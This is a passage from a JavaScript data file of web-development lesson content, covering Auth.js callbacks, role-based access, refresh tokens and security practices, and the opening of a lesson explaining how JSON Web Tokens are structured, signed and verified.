            content: "Default session:"
          },
          {
            type: "output",
            content: [
              "User",
              "Name",
              "Email",
              "Image"
            ]
          },
          {
            type: "paragraph",
            content: "Many applications need additional information."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Role",
              "Subscription",
              "Organization",
              "Permissions",
              "Department"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {

 async session({ session, token }) {

   session.user.role = token.role

   session.user.plan = token.plan

   return session

 }

}`
          },
          {
            type: "paragraph",
            content: "Now every Client Component using useSession() receives this extra information."
          }
        ]
      },
      {
        heading: "JWT Callbacks",
        blocks: [
          {
            type: "paragraph",
            content: "JWT callbacks allow you to customize the token itself."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {

 async jwt({ token, user }) {

   if (user) {

     token.role = user.role

     token.organization = user.organization

   }

   return token

 }

}`
          },
          {
            type: "paragraph",
            content: "JWT callbacks execute:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "During login",
              "During token refresh",
              "During session updates"
            ]
          }
        ]
      },
      {
        heading: "Relationship Between JWT and Session",
        blocks: [
          {
            type: "flow",
            steps: [
              "Database", "→",
              "User", "→",
              "JWT Callback", "→",
              "JWT Token", "→",
              "Session Callback", "→",
              "Session Object", "→",
              "Client"
            ]
          },
          {
            type: "paragraph",
            content: "JWT stores data."
          },
          {
            type: "paragraph",
            content: "Session exposes safe data to the frontend."
          }
        ]
      },
      {
        heading: "Role Integration",
        blocks: [
          {
            type: "paragraph",
            content: "Most applications have multiple user roles."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Guest", "→",
              "User", "→",
              "Moderator", "→",
              "Admin", "→",
              "Super Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Each role has different permissions."
          }
        ]
      },
      {
        heading: "Saving Roles",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose the database contains:"
          },
          {
            type: "table",
            headers: ["User", "Role"],
            rows: [
              ["Alice", "Admin"],
              ["Bob", "User"]
            ]
          },
          {
            type: "paragraph",
            content: "JWT callback:"
          },
          {
            type: "code",
            language: "javascript",
            content: `token.role = user.role`
          },
          {
            type: "paragraph",
            content: "Session callback:"
          },
          {
            type: "code",
            language: "javascript",
            content: `session.user.role = token.role`
          },
          {
            type: "paragraph",
            content: "Now the role becomes available everywhere."
          }
        ]
      },
      {
        heading: "Protecting Admin Pages",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `const session = await auth()

if (session?.user.role !== "admin") {

   redirect("/403")

}`
          },
          {
            type: "paragraph",
            content: "This is a common production pattern."
          }
        ]
      },
      {
        heading: "Role-Based UI",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "jsx",
            content: `{
 session?.user.role === "admin" &&
 (
   <AdminPanel />
 )
}`
          },
          {
            type: "paragraph",
            content: "Only administrators see the component."
          },
          {
            type: "note",
            content: "UI checks improve UX, but server-side checks enforce security."
          }
        ]
      },
      {
        heading: "Refresh Tokens",
        blocks: [
          {
            type: "paragraph",
            content: "OAuth providers usually issue:"
          },
          {
            type: "output",
            content: [
              "Access Token",
              "Refresh Token"
            ]
          },
          {
            type: "paragraph",
            content: "Access tokens expire."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Access Token", "→",
              "1 Hour", "→",
              "Expired"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of forcing users to log in again, Auth.js can refresh the token."
          }
        ]
      },
      {
        heading: "Refresh Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Access Token Expires", "→",
              "Refresh Token", "→",
              "OAuth Provider", "→",
              "New Access Token", "→",
              "Continue Session"
            ]
          },
          {
            type: "paragraph",
            content: "The user never notices."
          }
        ]
      },
      {
        heading: "Why Refresh Tokens Matter",
        blocks: [
          {
            type: "paragraph",
            content: "Without refresh tokens:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "1 Hour", "→",
              "Logged Out"
            ]
          },
          {
            type: "paragraph",
            content: "With refresh tokens:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Refresh", "→",
              "Refresh", "→",
              "Refresh", "→",
              "Stay Logged In"
            ]
          },
          {
            type: "paragraph",
            content: "This significantly improves user experience."
          }
        ]
      },
      {
        heading: "Security",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication is one of the most security-critical parts of an application."
          },
          {
            type: "paragraph",
            content: "Auth.js includes many protections automatically."
          },
          {
            type: "paragraph",
            content: "Secure Cookies"
          },
          {
            type: "paragraph",
            content: "Production cookies should be:"
          },
          {
            type: "output",
            content: [
              "HttpOnly",
              "Secure",
              "SameSite=Lax"
            ]
          },
          {
            type: "paragraph",
            content: "This helps defend against:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "XSS",
              "CSRF",
              "Cookie theft"
            ]
          }
        ]
      },
      {
        heading: "CSRF Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an attacker creating:"
          },
          {
            type: "output",
            content: [
              "<form action=\"/transfer-money\">"
            ]
          },
          {
            type: "paragraph",
            content: "Without CSRF protection, a logged-in user might unknowingly submit the request."
          },
          {
            type: "paragraph",
            content: "Auth.js generates and validates CSRF tokens to prevent such attacks."
          }
        ]
      },
      {
        heading: "OAuth State Validation",
        blocks: [
          {
            type: "paragraph",
            content: "OAuth login includes a randomly generated state value."
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Random State", "→",
              "OAuth Provider", "→",
              "Return State", "→",
              "Verify"
            ]
          },
          {
            type: "paragraph",
            content: "If the state doesn't match, the login is rejected, helping prevent request forgery."
          }
        ]
      },
      {
        heading: "Session Security",
        blocks: [
          {
            type: "paragraph",
            content: "Good practices include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Short session lifetimes.",
              "HTTPS everywhere.",
              "Session rotation.",
              "Secure cookie attributes.",
              "Refresh tokens with expiration.",
              "Device verification for sensitive actions.",
              "Multi-factor authentication."
            ]
          }
        ]
      },
      {
        heading: "Secrets",
        blocks: [
          {
            type: "paragraph",
            content: "Never hardcode secrets."
          },
          {
            type: "paragraph",
            content: "Incorrect:"
          },
          {
            type: "code",
            language: "javascript",
            content: `secret: "my-secret"`
          },
          {
            type: "paragraph",
            content: "Correct:"
          },
          {
            type: "code",
            language: "javascript",
            content: `secret: process.env.AUTH_SECRET`
          },
          {
            type: "paragraph",
            content: "Environment variables protect sensitive credentials."
          }
        ]
      },
      {
        heading: "Production Deployment",
        blocks: [
          {
            type: "paragraph",
            content: "Deploying authentication involves more than publishing code."
          },
          {
            type: "paragraph",
            content: "Environment Variables"
          },
          {
            type: "paragraph",
            content: "Typical configuration:"
          },
          {
            type: "output",
            content: [
              "AUTH_SECRET",
              "AUTH_URL",
              "GOOGLE_CLIENT_ID",
              "GOOGLE_CLIENT_SECRET",
              "GITHUB_CLIENT_ID",
              "GITHUB_CLIENT_SECRET"
            ]
          },
          {
            type: "paragraph",
            content: "Keep these outside your repository."
          }
        ]
      },
      {
        heading: "HTTPS",
        blocks: [
          {
            type: "paragraph",
            content: "Production deployments should always use HTTPS."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "HTTPS", "→",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "HTTPS protects cookies and encrypted traffic."
          }
        ]
      },
      {
        heading: "Database",
        blocks: [
          {
            type: "paragraph",
            content: "Use a production database."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "PostgreSQL",
              "MySQL",
              "MongoDB",
              "PlanetScale",
              "Neon",
              "Supabase"
            ]
          },
          {
            type: "paragraph",
            content: "Avoid SQLite for high-traffic deployments."
          }
        ]
      },
      {
        heading: "Session Storage",
        blocks: [
          {
            type: "paragraph",
            content: "Database sessions are often stored in:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "PostgreSQL",
              "MySQL",
              "MongoDB",
              "Redis"
            ]
          },
          {
            type: "paragraph",
            content: "Choose a strategy based on scalability and revocation requirements."
          }
        ]
      },
      {
        heading: "Logging",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication events should be logged."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "output",
            content: [
              "Login",
              "Logout",
              "Password Change",
              "OAuth Error",
              "Token Refresh",
              "Failed Login"
            ]
          }
        ]
      },
      {
        heading: "Monitoring",
        blocks: [
          {
            type: "paragraph",
            content: "Monitor authentication metrics such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Failed login attempts.",
              "OAuth failures.",
              "Token refresh failures.",
              "Unusual geographic locations.",
              "Session creation rate."
            ]
          },
          {
            type: "paragraph",
            content: "These metrics help identify security incidents early."
          }
        ]
      },
      {
        heading: "Best Practices",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Use HTTPS everywhere.",
              "Use secure environment variables.",
              "Prefer server-side authentication checks.",
              "Store roles in JWT or database sessions appropriately.",
              "Validate authorization on the server.",
              "Rotate secrets when necessary.",
              "Use refresh tokens for OAuth.",
              "Keep session payloads small.",
              "Audit authentication events.",
              "Use MFA for sensitive accounts.",
              "Keep dependencies updated."
            ]
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Storing sensitive data inside JWTs.",
              "Trusting client-side role checks.",
              "Forgetting to protect API routes.",
              "Exposing secrets in source code.",
              "Using weak authentication secrets.",
              "Not handling expired OAuth tokens.",
              "Returning unnecessary user data in sessions.",
              "Skipping CSRF protection.",
              "Using HTTP in production.",
              "Assuming authentication automatically provides authorization."
            ]
          }
        ]
      },
      {
        heading: "Production Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                    User
                      │
                      ▼
               Next.js Application
                      │
         ┌────────────┴────────────┐
         ▼                         ▼
    Middleware                Route Handlers
         │                         │
         └────────────┬────────────┘
                      ▼
                  Auth.js Core
         ┌────────────┼─────────────┐
         ▼            ▼             ▼
    OAuth Providers  Callbacks   Session Strategy
         │            │             │
         └────────────┼─────────────┘
                      ▼
                  Adapter Layer
                      │
         ┌────────────┴────────────┐
         ▼                         ▼
     PostgreSQL                MongoDB
         │
         ▼
   User / Session / Account Tables`
          },
          {
            type: "paragraph",
            content: "This layered architecture keeps responsibilities separate:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Middleware protects routes.",
              "Route Handlers process authentication requests.",
              "Auth.js Core manages authentication.",
              "Callbacks customize behavior.",
              "Adapters abstract database access.",
              "Database stores persistent authentication data."
            ]
          }
        ]
      },
      {
        heading: "DevSphere Special Note 💡",
        blocks: [
          {
            type: "note",
            content: "Many developers think Auth.js is \"just a login library.\" In reality, it is an authentication framework that coordinates multiple security mechanisms: providers, sessions, callbacks, middleware, adapters, cookies, CSRF protection, and token management. A common mistake is trying to customize everything immediately. Instead, follow this progression: 1. Start with the default Auth.js configuration. 2. Add one provider (such as Google or Credentials). 3. Understand sessions and callbacks. 4. Add roles and authorization. 5. Customize pages. 6. Optimize for production with monitoring, logging, and secure deployment. Remember this principle: Authentication answers \"Who are you?\" Authorization answers \"What are you allowed to do?\" Auth.js helps with both, but they remain distinct concerns in your application architecture."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "Auth.js goes far beyond basic sign-in functionality. It provides a complete authentication framework that supports custom login pages, secure route protection, session customization, JWT enrichment, role-based access control, OAuth token refresh, and production-grade security practices."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "How to create custom authentication pages.",
              "How to protect pages and APIs.",
              "How session and JWT callbacks work together.",
              "How to integrate user roles into authentication.",
              "How refresh tokens maintain long-lived OAuth sessions.",
              "Security mechanisms built into Auth.js.",
              "Production deployment considerations.",
              "Common mistakes and best practices.",
              "A scalable architecture for enterprise applications."
            ]
          },
          {
            type: "paragraph",
            content: "With Parts 1 and 2 combined, you now have a comprehensive understanding of Auth.js—from its architecture and providers to advanced customization, security, and production deployment. The next lessons (JWT Authentication, Protected Routes, Authorization, and Role-Based Access Control) will build on this foundation by exploring each of those topics in much greater depth."
          }
        ]
      }
    ]
  },




  /* ===========================
    Fourth Topic : JWT Authentication
============================= */
    "nextjs-jwt-authentication": {
    title: "JWT Authentication",
    readingTime: "30 min",
        
    content: [
      {
        heading: "JWT Authentication — Part 1",
        blocks: [
          {
            type: "paragraph",
            content: "Mastering JSON Web Tokens (JWT) from Scratch"
          },
          {
            type: "paragraph",
            content: "Goal: Understand what JWTs are, why they exist, how they work internally, how they are created and verified, and how they enable secure stateless authentication in modern Next.js applications."
          }
        ]
      },
      {
        heading: "Introduction to JWT Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication answers one simple question:"
          },
          {
            type: "output",
            content: [
              "\"Who is making this request?\""
            ]
          },
          {
            type: "paragraph",
            content: "Once a user logs in successfully, the server must remember their identity for future requests."
          },
          {
            type: "paragraph",
            content: "Traditionally, this was done using server-side sessions, where the server stored session data in memory or a database."
          },
          {
            type: "paragraph",
            content: "However, as web applications became distributed across multiple servers, regions, and cloud providers, maintaining centralized session storage became increasingly complex."
          },
          {
            type: "paragraph",
            content: "To solve this problem, JSON Web Tokens (JWTs) were introduced."
          },
          {
            type: "paragraph",
            content: "Instead of storing user identity on the server, JWT stores authenticated user information inside a cryptographically signed token that travels with every request."
          },
          {
            type: "paragraph",
            content: "This enables stateless authentication, making JWT one of the most widely used authentication mechanisms for APIs, SPAs, mobile applications, and modern frameworks like Next.js."
          }
        ]
      },
      {
        heading: "What is JWT?",
        blocks: [
          {
            type: "paragraph",
            content: "JWT stands for:"
          },
          {
            type: "output",
            content: [
              "JSON Web Token"
            ]
          },
          {
            type: "paragraph",
            content: "A JWT is a compact, URL-safe, and digitally signed token used to securely transmit information between two parties."
          },
          {
            type: "paragraph",
            content: "Unlike random session IDs, JWTs are self-contained."
          },
          {
            type: "paragraph",
            content: "They carry useful information such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User ID",
              "Email",
              "Roles",
              "Permissions",
              "Expiration time",
              "Issuer",
              "Audience"
            ]
          },
          {
            type: "paragraph",
            content: "A server can verify the authenticity of a JWT without storing session data."
          },
          {
            type: "paragraph",
            content: "Official Definition"
          },
          {
            type: "paragraph",
            content: "A JWT is a JSON object encoded into a compact string and protected with a cryptographic signature."
          },
          {
            type: "paragraph",
            content: "Think of it as a tamper-proof digital identity card."
          }
        ]
      },
      {
        heading: "Why JWT Exists",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine a traditional web application."
          },
          {
            type: "flow",
            steps: [
              "Client", "→",
              "Login", "→",
              "Server", "→",
              "Creates Session", "→",
              "Stores Session in Database", "→",
              "Returns Session ID Cookie"
            ]
          },
          {
            type: "paragraph",
            content: "Every future request requires:"
          },
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Read Cookie", "→",
              "Database Lookup", "→",
              "Find Session", "→",
              "Authenticate User"
            ]
          },
          {
            type: "paragraph",
            content: "This works well for small applications."
          },
          {
            type: "paragraph",
            content: "However, large applications face challenges."
          }
        ]
      },
      {
        heading: "Problems with Server Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose your application runs on ten servers."
          },
          {
            type: "code",
            language: "text",
            content: `          Load Balancer
          /    |    \\
         /     |     \\
 Server1 Server2 Server3`
          },
          {
            type: "paragraph",
            content: "A user's request can reach any server."
          },
          {
            type: "paragraph",
            content: "Questions arise:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Which server has the session?",
              "How are sessions synchronized?",
              "What happens if one server crashes?",
              "How do you scale globally?"
            ]
          },
          {
            type: "paragraph",
            content: "Solutions often require:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Redis",
              "Shared databases",
              "Sticky sessions",
              "Session replication"
            ]
          },
          {
            type: "paragraph",
            content: "These add complexity and infrastructure costs."
          }
        ]
      },
      {
        heading: "The JWT Solution",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of storing authentication state on the server:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Create JWT", "→",
              "Return JWT", "→",
              "Client Stores JWT", "→",
              "Every Request Includes JWT", "→",
              "Server Verifies Signature", "→",
              "Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "The server doesn't need to remember anything."
          },
          {
            type: "paragraph",
            content: "All required identity information travels with the request."
          },
          {
            type: "paragraph",
            content: "This is called stateless authentication."
          }
        ]
      },
      {
        heading: "What is Stateless Authentication?",
        blocks: [
          {
            type: "paragraph",
            content: "A stateless system does not store client authentication state between requests."
          },
          {
            type: "paragraph",
            content: "Each request contains everything needed to authenticate the user."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "GET /dashboard",
              "",
              "Authorization:",
              "Bearer eyJhbGc..."
            ]
          },
          {
            type: "paragraph",
            content: "The server verifies the token."
          },
          {
            type: "paragraph",
            content: "If valid:"
          },
          {
            type: "output",
            content: [
              "Access Granted"
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "output",
            content: [
              "401 Unauthorized"
            ]
          },
          {
            type: "paragraph",
            content: "No session lookup is required."
          }
        ]
      },
      {
        heading: "Stateful vs Stateless Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Stateful Authentication"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Cookie", "→",
              "Server", "→",
              "Session ID", "→",
              "Database", "→",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "The server stores authentication state."
          },
          {
            type: "paragraph",
            content: "Stateless Authentication"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "JWT", "→",
              "Server", "→",
              "Verify Signature", "→",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "The token itself contains authentication information."
          }
        ]
      },
      {
        heading: "Comparison",
        blocks: [
          {
            type: "table",
            headers: ["Stateful Sessions", "JWT Authentication"],
            rows: [
              ["Server stores session", "Client stores token"],
              ["Requires session storage", "No session storage"],
              ["Database lookup", "Signature verification"],
              ["Easy logout", "Harder logout (without revocation)"],
              ["Good for traditional apps", "Excellent for APIs and distributed systems"]
            ]
          },
          {
            type: "paragraph",
            content: "Neither approach is universally superior. Choose based on your application's architecture and requirements."
          }
        ]
      },
      {
        heading: "JWT Structure",
        blocks: [
          {
            type: "paragraph",
            content: "A JWT always contains three parts."
          },
          {
            type: "output",
            content: [
              "HEADER.PAYLOAD.SIGNATURE"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "xxxxx.yyyyy.zzzzz"
            ]
          },
          {
            type: "paragraph",
            content: "Each part is Base64URL encoded and separated by periods (.)."
          },
          {
            type: "paragraph",
            content: "Visual Structure"
          },
          {
            type: "code",
            language: "text",
            content: `┌───────────┐
│  Header   │
└───────────┘
      .
┌───────────┐
│  Payload  │
└───────────┘
      .
┌───────────┐
│ Signature │
└───────────┘`
          },
          {
            type: "paragraph",
            content: "Together they form the JWT."
          }
        ]
      },
      {
        heading: "Part 1 — Header",
        blocks: [
          {
            type: "paragraph",
            content: "The header describes how the token is protected."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "alg": "HS256",
  "typ": "JWT"
}`
          },
          {
            type: "paragraph",
            content: "Meaning:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "alg → Signing algorithm",
              "typ → Token type"
            ]
          }
        ]
      },
      {
        heading: "Common Algorithms",
        blocks: [
          {
            type: "table",
            headers: ["Algorithm", "Type"],
            rows: [
              ["HS256", "HMAC SHA-256"],
              ["HS384", "HMAC SHA-384"],
              ["HS512", "HMAC SHA-512"],
              ["RS256", "RSA SHA-256"],
              ["ES256", "Elliptic Curve"]
            ]
          },
          {
            type: "paragraph",
            content: "HS256 is commonly used in many applications."
          },
          {
            type: "paragraph",
            content: "RS256 is often preferred in enterprise and microservice architectures because it separates signing (private key) from verification (public key)."
          }
        ]
      },
      {
        heading: "Part 2 — Payload",
        blocks: [
          {
            type: "paragraph",
            content: "The payload contains the actual data."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "sub": "12345",
  "name": "Alice",
  "role": "admin",
  "exp": 1750000000
}`
          },
          {
            type: "paragraph",
            content: "This information is called claims."
          }
        ]
      },
      {
        heading: "Types of Claims",
        blocks: [
          {
            type: "paragraph",
            content: "Registered Claims"
          },
          {
            type: "paragraph",
            content: "Standard fields defined by the JWT specification."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "table",
            headers: ["Claim", "Meaning"],
            rows: [
              ["iss", "Issuer"],
              ["sub", "Subject"],
              ["aud", "Audience"],
              ["exp", "Expiration"],
              ["nbf", "Not Before"],
              ["iat", "Issued At"],
              ["jti", "Token ID"]
            ]
          },
          {
            type: "paragraph",
            content: "Public Claims"
          },
          {
            type: "paragraph",
            content: "Application-defined but standardized names."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "role": "admin"
}`
          },
          {
            type: "paragraph",
            content: "Private Claims"
          },
          {
            type: "paragraph",
            content: "Custom values specific to your application."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "department": "Engineering",
  "subscription": "Pro",
  "organization": "DevSphere"
}`
          }
        ]
      },
      {
        heading: "Part 3 — Signature",
        blocks: [
          {
            type: "paragraph",
            content: "The signature guarantees that the token has not been modified."
          },
          {
            type: "paragraph",
            content: "Example (conceptually):"
          },
          {
            type: "output",
            content: [
              "HMACSHA256(",
              "",
              "Header +",
              "",
              "Payload +",
              "",
              "Secret",
              "",
              ")"
            ]
          },
          {
            type: "paragraph",
            content: "If anyone changes the payload:"
          },
          {
            type: "flow",
            steps: [
              "role: admin", "→",
              "role: user"
            ]
          },
          {
            type: "paragraph",
            content: "the signature becomes invalid."
          },
          {
            type: "paragraph",
            content: "The server immediately rejects the token."
          }
        ]
      },
      {
        heading: "Putting It All Together",
        blocks: [
          {
            type: "flow",
            steps: [
              "Header", "→",
              "Base64URL", "→",
              "Payload", "→",
              "Base64URL", "→",
              "Signature", "→",
              "JWT"
            ]
          },
          {
            type: "paragraph",
            content: "Result:"
          },
          {
            type: "output",
            content: [
              "xxxxx.yyyyy.zzzzz"
            ]
          }
        ]
      },
      {
        heading: "Encoding vs Encryption",
        blocks: [
          {
            type: "paragraph",
            content: "This is one of the most misunderstood topics in JWT."
          },
          {
            type: "paragraph",
            content: "Many beginners believe JWTs are encrypted."
          },
          {
            type: "paragraph",
            content: "They are not."
          },
          {
            type: "paragraph",
            content: "Encoding"
          },
          {
            type: "paragraph",
            content: "Encoding converts data into another format."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "JSON", "→",
              "Base64URL", "→",
              "Encoded Text"
            ]
          },
          {
            type: "paragraph",
            content: "Anyone can decode it."
          },
          {
            type: "paragraph",
            content: "Encryption"
          },
          {
            type: "paragraph",
            content: "Encryption transforms data into unreadable ciphertext using an encryption key."
          },
          {
            type: "paragraph",
            content: "Without the correct key:"
          },
          {
            type: "flow",
            steps: [
              "Encrypted Data", "→",
              "Unreadable"
            ]
          }
        ]
      },
      {
        heading: "JWT Uses Encoding, Not Encryption",
        blocks: [
          {
            type: "paragraph",
            content: "Example payload:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "email": "alice@example.com"
}`
          },
          {
            type: "paragraph",
            content: "Anyone with the token can decode the payload."
          },
          {
            type: "paragraph",
            content: "Therefore:"
          },
          {
            type: "paragraph",
            content: "Never store sensitive information such as passwords, API secrets, credit card numbers, or personal financial data inside a JWT."
          }
        ]
      },
      {
        heading: "Signing",
        blocks: [
          {
            type: "paragraph",
            content: "Signing proves that the token was created by a trusted source."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Header\n\n+\n\nPayload\n\n+\n\nSecret Key", "→",
              "Signing Algorithm", "→",
              "Signature"
            ]
          },
          {
            type: "paragraph",
            content: "Only someone with the secret (or private key in asymmetric algorithms) can generate a valid signature."
          }
        ]
      },
      {
        heading: "Verification",
        blocks: [
          {
            type: "paragraph",
            content: "When a request arrives:"
          },
          {
            type: "flow",
            steps: [
              "JWT", "→",
              "Extract Header", "→",
              "Extract Payload", "→",
              "Recompute Signature", "→",
              "Compare Signatures"
            ]
          },
          {
            type: "paragraph",
            content: "If the signatures match:"
          },
          {
            type: "output",
            content: [
              "Valid Token"
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "output",
            content: [
              "Invalid Token"
            ]
          }
        ]
      },
      {
        heading: "Internal Verification Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Incoming Request", "→",
              "JWT", "→",
              "Decode Header", "→",
              "Decode Payload", "→",
              "Verify Signature", "→",
              "Check Expiration", "→",
              "Check Issuer", "→",
              "Check Audience", "→",
              "Authenticated User"
            ]
          },
          {
            type: "paragraph",
            content: "Each step must succeed before access is granted."
          }
        ]
      },
      {
        heading: "Token Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "JWTs are temporary."
          },
          {
            type: "paragraph",
            content: "A typical lifecycle looks like:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Issue JWT", "→",
              "Client Stores JWT", "→",
              "API Requests", "→",
              "Expiration", "→",
              "Refresh or Re-login"
            ]
          },
          {
            type: "paragraph",
            content: "This limits the impact of compromised tokens."
          }
        ]
      },
      {
        heading: "Access Token",
        blocks: [
          {
            type: "paragraph",
            content: "The Access Token is used to access protected resources."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User Logs In", "→",
              "Access Token", "→",
              "API Calls"
            ]
          },
          {
            type: "paragraph",
            content: "Characteristics:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Short lifetime (e.g., 5–60 minutes)",
              "Sent with most authenticated requests",
              "Contains user claims",
              "Expires automatically"
            ]
          }
        ]
      },
      {
        heading: "Why Short-Lived Access Tokens?",
        blocks: [
          {
            type: "paragraph",
            content: "If an attacker steals a short-lived token:"
          },
          {
            type: "flow",
            steps: [
              "Steal Token", "→",
              "Expires Soon", "→",
              "Attack Window Limited"
            ]
          },
          {
            type: "paragraph",
            content: "Short expiration reduces risk."
          }
        ]
      },
      {
        heading: "Refresh Token",
        blocks: [
          {
            type: "paragraph",
            content: "A Refresh Token allows the client to obtain a new Access Token without requiring the user to log in again."
          },
          {
            type: "paragraph",
            content: "Workflow:"
          },
          {
            type: "flow",
            steps: [
              "Access Token Expires", "→",
              "Refresh Token", "→",
              "Authentication Server", "→",
              "New Access Token"
            ]
          }
        ]
      },
      {
        heading: "Access Token vs Refresh Token",
        blocks: [
          {
            type: "table",
            headers: ["Access Token", "Refresh Token"],
            rows: [
              ["Short lifetime", "Long lifetime"],
              ["Used for APIs", "Used to request new access tokens"],
              ["Sent frequently", "Sent rarely"],
              ["Higher exposure", "Better protected"],
              ["Expires quickly", "Can be revoked independently"]
            ]
          }
        ]
      },
      {
        heading: "Login Workflow",
        blocks: [
          {
            type: "paragraph",
            content: "Let's examine the complete JWT login process."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Enter Credentials", "→",
              "Server Validates Credentials", "→",
              "Generate JWT", "→",
              "Return JWT", "→",
              "Store Token", "→",
              "Authenticated"
            ]
          }
        ]
      },
      {
        heading: "Detailed Login Lifecycle",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "POST /login", "→",
              "Server", "→",
              "Find User", "→",
              "Verify Password", "→",
              "Generate JWT", "→",
              "Sign JWT", "→",
              "Return Token", "→",
              "Store Cookie / Secure Storage", "→",
              "Future Requests"
            ]
          }
        ]
      },
      {
        heading: "Logout Workflow",
        blocks: [
          {
            type: "paragraph",
            content: "JWT logout differs from session-based logout."
          },
          {
            type: "paragraph",
            content: "Traditional session logout:"
          },
          {
            type: "flow",
            steps: [
              "Delete Session", "→",
              "Done"
            ]
          },
          {
            type: "paragraph",
            content: "JWT logout often involves:"
          },
          {
            type: "flow",
            steps: [
              "Delete Token", "→",
              "Clear Cookie", "→",
              "(Optional) Revoke Refresh Token", "→",
              "Logout Complete"
            ]
          },
          {
            type: "paragraph",
            content: "If access tokens are stateless, they remain valid until expiration unless you implement a revocation strategy."
          }
        ]
      },
      {
        heading: "Code Example — Creating a JWT",
        blocks: [
          {
            type: "paragraph",
            content: "Using the popular jsonwebtoken library:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import jwt from "jsonwebtoken";

const token = jwt.sign(
  {
    userId: 123,
    role: "admin",
  },
  process.env.JWT_SECRET!,
  {
    expiresIn: "15m",
  }
);

console.log(token);`
          },
          {
            type: "paragraph",
            content: "This creates a signed token valid for 15 minutes."
          }
        ]
      },
      {
        heading: "Code Example — Verifying a JWT",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `import jwt from "jsonwebtoken";

try {
  const payload = jwt.verify(
    token,
    process.env.JWT_SECRET!
  );

  console.log(payload);

} catch {

  console.log("Invalid Token");

}`
          },
          {
            type: "paragraph",
            content: "The library verifies both the signature and expiration."
          }
        ]
      },
      {
        heading: "Code Example — Sending a JWT",
        blocks: [
          {
            type: "paragraph",
            content: "A client includes the token in the Authorization header:"
          },
          {
            type: "output",
            content: [
              "GET /api/profile HTTP/1.1",
              "Authorization: Bearer eyJhbGc..."
            ]
          },
          {
            type: "paragraph",
